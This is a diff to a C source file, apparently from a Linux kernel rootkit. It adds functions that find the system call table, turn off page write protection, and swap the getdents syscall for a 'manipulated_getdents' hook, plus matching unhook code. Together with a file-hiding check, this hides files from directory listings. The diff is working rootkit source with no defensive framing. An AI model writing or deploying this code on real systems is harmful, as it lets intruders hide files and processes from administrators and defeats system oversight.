@@ -3,10 +3,21 @@
  * getdents syscall.
  */
 #include <asm/uaccess.h>
+#include <linux/delay.h>
+#include <linux/unistd.h>
 
 #include "include.h"
 #include "main.h"
 
+/* pointers to some important kernel functions/resources */
+asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage ssize_t (*syscall_readlinkat) (int dirfd, const char *path, char *buf, size_t bufsiz);
+
+/*
+ * call counter to ensure that we are not unhooking the
+ * getdents function while it is in use
+ */
+int getdents_call_counter = 0;
 
 /* Check whether we need to hide this file */
 int hide(char *d_name)
@@ -106,5 +117,47 @@ asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user
 	return ret;
 }
 
+/*
+ * hooks the system call 'getdents'
+ */
+void hook_getdents(void) {
+	void **sys_call_table = (void *) sysmap_sys_call_table;
 
+	/* get the 'readlinkat' syscall */
+	syscall_readlinkat = (void*) sys_call_table[__NR_readlinkat];
 
+	/* disable write protection */
+	disable_page_protection();
+
+	/* replace the syscall getdents */
+	original_getdents = (void *) sys_call_table[__NR_getdents];
+	sys_call_table[__NR_getdents] = (int *) manipulated_getdents;
+
+	/* reenable write protection */
+	enable_page_protection();
+
+	return;
+}
+
+/*
+ * restores the original system call 'getdents'
+ */
+void unhook_getdents(void) {
+	void **sys_call_table = (void *) sysmap_sys_call_table;
+
+	/* disable write protection */
+	disable_page_protection();
+
+	/* make sure that all processes have left our manipulated syscall */
+	while(getdents_call_counter > 0) {
+		msleep(10);
+	}
+
+	/* restore the old syscall */
+	sys_call_table[__NR_getdents] = (int *) original_getdents;
+
+	/* reenable write protection */
+	enable_page_protection();
+	
+	return;
+}
